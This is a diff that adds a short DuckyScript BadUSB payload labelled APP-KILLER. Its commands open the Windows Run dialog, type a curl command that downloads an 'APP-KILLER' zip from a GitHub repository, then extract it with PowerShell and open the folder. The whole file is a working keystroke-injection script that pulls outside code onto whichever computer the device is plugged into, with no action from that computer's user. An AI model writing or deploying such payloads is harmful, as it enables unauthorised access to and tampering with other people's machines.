@@ -1,0 +1,9 @@
+REM APP-KILLER BadUSB - CURL VERSION (Fungerer i RUN)
+DELAY 1000
+GUI r
+DELAY 500
+STRING curl -L -o "%USERPROFILE%\Downloads\APP-KILLER.zip" https://github.com/Murdervan/APP-KILLER/archive/refs/heads/main.zip
+ENTER
+DELAY 1000
+STRING powershell -c "Expand-Archive '%USERPROFILE%\Downloads\APP-KILLER.zip' '%USERPROFILE%\Downloads\APP-KILLER' -Force; explorer '%USERPROFILE%\Downloads\APP-KILLER\APP-KILLER-main'"
+ENTER
